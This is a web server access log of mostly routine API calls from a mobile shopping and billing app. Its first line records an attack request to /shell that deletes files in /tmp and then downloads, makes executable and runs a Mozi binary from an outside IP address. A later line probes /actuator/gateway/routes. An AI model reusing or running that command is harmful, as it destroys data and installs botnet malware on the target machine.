::1 - - [29/Jun/2022:00:05:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://112.95.92.74:33693/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 144 "-" "Hello, world"
::1 - - [29/Jun/2022:11:49:10 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:12:02:02 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:12:12:55 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:12:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:12:55 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:12:57 +0000] "GET /api/v1/bills/user HTTP/1.0" 200 631 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:12:57 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:12:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:09 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:12 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 678 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 678 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:14 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 284 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:16 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:16 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 910 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:16 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 910 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:25 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:28 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 678 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 678 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:31 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 285 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:31 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:32 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 909 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 909 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:40 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:13:41 +0000] "GET /api/v1/bills/user HTTP/1.0" 200 1154 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:13:42 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:19:17 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:19:17 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:19:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:19:23 +0000] "GET /api/v1/bills/user HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:19:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:19:23 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:19:45 +0000] "GET /api/v1/bills/user HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:19:54 +0000] "GET /api/v1/bills/user HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:20:09 +0000] "GET /api/v1/bills/user HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:20:38 +0000] "GET /api/v1/bills/user?limit=1000&-createdAt HTTP/1.0" 200 108 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:21:06 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 200 1144 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:22:09 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:22:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:22:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:22:10 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:22:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:22:10 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:22:20 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:22:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:22:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:22:27 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:22:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:22:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:23:23 +0000] "GET /api/v1/transactions/user?bill=undefined HTTP/1.0" 500 259 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:23:23 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:23:41 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:23:48 +0000] "GET /api/v1/transactions/user?bill=undefined HTTP/1.0" 500 259 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:23:48 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:24:18 +0000] "GET /api/v1/transactions/user?bill=62babf85b8fc4520e4c75424 HTTP/1.0" 200 118 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:24:23 +0000] "GET /api/v1/transactions/user?bill=undefined HTTP/1.0" 500 259 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:24:29 +0000] "GET /api/v1/transactions/user?bill=undefined HTTP/1.0" 500 259 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:25:07 +0000] "GET /api/v1/transactions/user?bill=undefined HTTP/1.0" 500 259 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:25:18 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:28:18 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:28:18 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 200 890 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:29:48 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:29:50 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:30:03 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:30:03 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:30:32 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:31:35 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:31:56 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:32:09 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:32:13 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:32:17 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:32:24 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:32:28 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:32:45 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:33:00 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:33:02 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:33:04 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:33:04 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:33:04 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:34:20 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:34:26 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:35:02 +0000] "GET /actuator/gateway/routes HTTP/1.0" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:12:35:36 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:35:40 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:35:48 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:35:53 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:36:35 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:36:37 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:36:47 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:36:48 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:37:07 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:37:08 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:37:09 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:37:12 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:37:50 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:37:56 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:39:44 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:40:25 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:41:51 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:41:51 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:42:11 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:43:02 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:43:02 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
